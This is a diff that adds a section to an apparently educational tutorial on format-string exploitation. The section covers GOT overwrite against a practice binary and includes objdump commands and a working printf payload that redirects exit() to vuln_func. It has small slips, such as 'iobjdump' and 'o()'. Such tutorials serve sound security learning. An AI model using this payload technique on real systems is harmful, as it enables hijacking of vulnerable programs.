@@ -153,8 +153,42 @@ Bingo, `\x10\x98\x04\x08` point to 0x1025544 !
 
 ## Code execution redirect
 
-*section need to be write*
- 
+There is two way to redirect the code execution.
+
+- Overwrite return pointer in the stack by [writing complex value](#write-complex-value)
+- Overwrite function call before return pointer
+
+Lets say, exit() is call before return. So you can't overwrite return pointer.
+
+### GOT Overwrite
+
+Basically, when the program is executed, the GOT (Global Offset Table) is initialized for every external functions (like libc functions). By doing so, the executable will cache the memory address in the GOT, so that it doesn’t have to ask libc each time an external function is called.
+
+The goal here will be to overwrite the address of exit() in the GOT with the address of vuln_func(). There are 4 steps here :
+
+- Find the address of o()
+- Find the address of exit() in GOT
+- Find the offset of our string on the stack
+- Write the proper exploit string
+
+```bash
+iobjdump -R ./level5 | grep exit                                                     
+08049838 R_386_JUMP_SLOT   exit@GLIBC_2.0
+
+objdump -t ./level5 | grep vuln_func
+080484a4 g     F .text	0000001e              vuln_func
+```
+
+You have the pointer to overwrite (0x08049838) with the value to overwrite (0x080484a4).
+
+You can [overwrite the data](#overwrite-data-with-pointer-to-it) by using [this techinique to write large data](#write-complex-value)
+
+Example of payload :
+
+```bash
+cat <(python3 -c 'import sys; sys.stdout.buffer.write(b"\x38\x98\x04\x08" + b"\x3a\x98\x04\x08" + b"%2044x" + b"%5$hn" + b"%31904x" + b"%4$hn")') - | ./vuln
+```
+
 ### Docum
 
 - [Insane Tuto](https://axcheron.github.io/exploit-101-format-strings/)
